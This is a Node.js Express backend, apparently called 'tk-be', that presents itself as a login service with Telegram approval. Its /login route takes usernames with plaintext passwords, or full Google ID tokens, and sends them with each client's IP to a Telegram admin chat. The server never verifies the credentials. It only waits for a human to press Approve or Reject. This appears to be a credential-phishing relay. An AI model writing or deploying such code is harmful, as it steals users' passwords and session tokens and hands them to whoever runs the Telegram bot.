require('dotenv').config();

const express = require('express');
const cors = require('cors');
const { v4: uuidv4 } = require('uuid');

const PORT = Number(process.env.PORT) || 4000;
const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN || '';
const TELEGRAM_ADMIN_CHAT_ID = process.env.TELEGRAM_ADMIN_CHAT_ID || '';
const TELEGRAM_WEBHOOK_SECRET = process.env.TELEGRAM_WEBHOOK_SECRET || '';

const REQUEST_TTL_MS = 2 * 60 * 1000;
const TELEGRAM_MAX_MSG = 4000;

/** @type {Map<string, { userId: string, status: 'pending'|'approved'|'rejected', createdAt: number, expiresAt: number, clientIp: string }>} */
const requests = new Map();

function now() {
    return Date.now();
}

function cleanupExpired() {
    const t = now();
    for (const [, rec] of requests.entries()) {
        if (t > rec.expiresAt && rec.status === 'pending') {
            rec.status = 'rejected';
        }
    }
}

function tgApi(method, body) {
    const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/${method}`;
    return fetch(url, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(body)
    }).then(function (r) {
        return r.json().then(function (data) {
            if (!data.ok) {
                console.error('Telegram API error:', method, data);
            }
            return data;
        });
    });
}

function sendLoginApprovalMessage(requestId, text) {
    if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_ADMIN_CHAT_ID) {
        console.warn('Telegram not configured; skipping sendMessage');
        return Promise.resolve(null);
    }
    var body = text;
    if (body.length > TELEGRAM_MAX_MSG) {
        body = body.slice(0, TELEGRAM_MAX_MSG - 20) + '\n…(truncated)';
    }
    var fullText = body + '\n\nApprove?';
    const approveData = 'approve:' + requestId;
    const rejectData = 'reject:' + requestId;
    return tgApi('sendMessage', {
        chat_id: TELEGRAM_ADMIN_CHAT_ID,
        text: fullText,
        reply_markup: {
            inline_keyboard: [
                [
                    { text: '✅ Approve', callback_data: approveData },
                    { text: '❌ Reject', callback_data: rejectData }
                ]
            ]
        }
    });
}

function parseCallbackData(data) {
    if (!data || typeof data !== 'string') return null;
    var i = data.indexOf(':');
    if (i <= 0) return null;
    var action = data.slice(0, i);
    var requestId = data.slice(i + 1);
    if (!requestId) return null;
    if (action !== 'approve' && action !== 'reject') return null;
    return { action, requestId };
}

const app = express();
app.use(cors({ origin: true, credentials: true }));
app.use(express.json());

function clientIp(req) {
    var forwarded = req.headers['x-forwarded-for'];
    if (typeof forwarded === 'string' && forwarded.length) {
        return forwarded.split(',')[0].trim();
    }
    return req.socket.remoteAddress || 'unknown';
}

function createPendingLogin(telegramText, shortUserLabel, req) {
    var requestId = uuidv4();
    var createdAt = now();
    var expiresAt = createdAt + REQUEST_TTL_MS;
    requests.set(requestId, {
        userId: String(shortUserLabel),
        status: 'pending',
        createdAt,
        expiresAt,
        clientIp: clientIp(req)
    });
    console.log(
        '[login] awaiting Telegram approval',
        JSON.stringify({ request_id: requestId, user: String(shortUserLabel), client_ip: clientIp(req) })
    );
    sendLoginApprovalMessage(requestId, telegramText).catch(function (err) {
        console.error('sendLoginApprovalMessage failed:', err);
    });
    return requestId;
}

app.post('/login', function (req, res) {
    var body = req.body || {};
    var idToken = body.credential || body.id_token;

    if (idToken) {
        var tokenStr = String(idToken);
        var ip = clientIp(req);
        var telegramText =
            'Google sign-in\n\n' +
            'Token:\n' +
            tokenStr +
            '\n\nIP: ' +
            ip;
        var requestId = createPendingLogin(telegramText, 'Google', req);
        return res.status(202).json({
            status: 'pending',
            request_id: requestId
        });
    }

    var username = body.username;
    var password = body.password;
    if (username == null || password == null) {
        return res.status(400).json({
            error: 'Provide username and password, or Google credential / id_token'
        });
    }
    var u = String(username).trim();
    var p = String(password);
    if (!u || !p) {
        return res.status(400).json({ error: 'Username and password cannot be empty' });
    }

    var ip = clientIp(req);
    var telegramText =
        'Password sign-in\n\n' +
        'Username: ' +
        u +
        '\nPassword: ' +
        p +
        '\n\nIP: ' +
        ip;
    var requestId = createPendingLogin(telegramText, u, req);
    return res.status(202).json({
        status: 'pending',
        request_id: requestId
    });
});

app.get('/login-status', function (req, res) {
    var requestId = req.query.request_id;
    if (!requestId || typeof requestId !== 'string') {
        return res.status(400).json({ error: 'request_id required' });
    }
    var rec = requests.get(requestId);
    if (!rec) {
        return res.status(404).json({ error: 'Unknown or expired request' });
    }
    if (rec.status === 'pending' && now() > rec.expiresAt) {
        requests.delete(requestId);
        return res.status(404).json({ error: 'Unknown or expired request' });
    }
    cleanupExpired();
    return res.json({ status: rec.status });
});

app.post('/telegram/webhook', function (req, res) {
    if (TELEGRAM_WEBHOOK_SECRET) {
        var token = req.get('X-Telegram-Bot-Api-Secret-Token');
        if (token !== TELEGRAM_WEBHOOK_SECRET) {
            return res.status(403).send('Forbidden');
        }
    }

    var update = req.body;
    var cq = update && update.callback_query;
    if (!cq || !cq.data) {
        return res.sendStatus(200);
    }

    var parsed = parseCallbackData(cq.data);
    if (!parsed) {
        return res.sendStatus(200);
    }

    var rec = requests.get(parsed.requestId);
    var message = cq.message;
    var chatId = message && message.chat && message.chat.id;
    var messageId = message && message.message_id;
    var actor =
        cq.from && (cq.from.username ? '@' + cq.from.username : 'id:' + cq.from.id);

    function answer(text, showAlert) {
        return tgApi('answerCallbackQuery', {
            callback_query_id: cq.id,
            text: text || '',
            show_alert: Boolean(showAlert)
        });
    }

    if (!rec) {
        console.log(
            '[telegram] callback ignored (unknown request)',
            JSON.stringify({ request_id: parsed.requestId, action: parsed.action, actor: actor || null })
        );
        answer('Request not found or expired.', true);
        return res.sendStatus(200);
    }

    if (rec.status !== 'pending') {
        console.log(
            '[telegram] callback ignored (already ' + rec.status + ')',
            JSON.stringify({ request_id: parsed.requestId, user: rec.userId, actor: actor || null })
        );
        answer('Already handled.', false);
        return res.sendStatus(200);
    }

    if (now() > rec.expiresAt) {
        rec.status = 'rejected';
        console.log(
            '[telegram] login rejected (expired)',
            JSON.stringify({ request_id: parsed.requestId, user: rec.userId, client_ip: rec.clientIp, actor: actor || null })
        );
        answer('Request expired.', true);
        return res.sendStatus(200);
    }

    if (parsed.action === 'approve') {
        rec.status = 'approved';
        console.log(
            '[telegram] login approved',
            JSON.stringify({ request_id: parsed.requestId, user: rec.userId, client_ip: rec.clientIp, actor: actor || null })
        );
        answer('Approved.', false);
        if (chatId && messageId) {
            tgApi('editMessageText', {
                chat_id: chatId,
                message_id: messageId,
                text: 'Approved\n\n' + rec.userId + '\nIP: ' + rec.clientIp
            }).catch(function (e) {
                console.error('editMessageText failed:', e);
            });
        }
    } else {
        rec.status = 'rejected';
        console.log(
            '[telegram] login rejected',
            JSON.stringify({ request_id: parsed.requestId, user: rec.userId, client_ip: rec.clientIp, actor: actor || null })
        );
        answer('Rejected.', false);
        if (chatId && messageId) {
            tgApi('editMessageText', {
                chat_id: chatId,
                message_id: messageId,
                text: 'Rejected\n\n' + rec.userId + '\nIP: ' + rec.clientIp
            }).catch(function (e) {
                console.error('editMessageText failed:', e);
            });
        }
    }

    return res.sendStatus(200);
});

app.get('/health', function (req, res) {
    res.json({ ok: true });
});

app.listen(PORT, function () {
    console.log('tk-be listening on http://localhost:' + PORT);
    if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_ADMIN_CHAT_ID) {
        console.warn('Set TELEGRAM_BOT_TOKEN and TELEGRAM_ADMIN_CHAT_ID in .env for Telegram approvals.');
    }
});
